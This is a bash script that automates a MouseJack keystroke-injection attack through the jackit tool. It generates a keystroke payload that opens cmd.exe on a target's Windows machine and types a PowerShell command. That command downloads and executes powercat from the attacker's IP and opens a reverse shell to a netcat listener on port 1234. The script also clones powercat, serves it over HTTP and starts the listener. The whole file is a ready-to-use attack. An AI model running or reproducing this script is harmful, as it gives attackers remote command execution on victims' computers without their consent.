#!/bin/bash

# This script downloads the Powercat script, launches a python HTTP server and starts netcat.
# It stores your local eth0 IP address in a variable and generates a payload for Powercat.
# Once the payload is generated jackit will be launched with the --script argument.

GRN='\033[0;32m'
NC='\033[0m'
YEL='\x1B[33m'
ip4=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1)

printf "${GRN}Generating shell.txt in MouseJack/jackit/\n${NC}"
cd
cd MouseJack/jackit/
touch shell.txt
printf "DELAY 1000\n" >> shell.txt
printf "GUI r\n" >> shell.txt
printf "DELAY 300\n" >> shell.txt
printf "STRING cmd.exe\n" >> shell.txt
printf "DELAY 300\n" >> shell.txt
printf "ENTER\n" >> shell.txt
printf "DELAY 300\n" >> shell.txt
printf "STRING powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://$ip4/powercat.ps1');powercat -c $ip4 -p 1234 -e cmd\"\n" >> shell.txt
printf "DELAY 300\n" >> shell.txt
printf "ENTER\n" >> shell.txt
printf "ENTER\n" >> shell.txt
printf "${GRN}Cloning Powercat payload repo...\n${NC}"
cd
cd MouseJack/
git clone https://github.com/besimorhino/powercat.git
cd powercat/
printf "${GRN}Starting HTTP Server on port:80...\n${NC}"
gnome-terminal -e "python -m SimpleHTTPServer 80"
printf "${GRN}Starting netcat listener on port:1234...\n${NC}"
gnome-terminal -e "nc -lvp 1234"
printf "${YEL}Launching jackit with payload...\n${NC}"
cd
gnome-terminal -e "jackit --script MouseJack/jackit/shell.txt --reset"
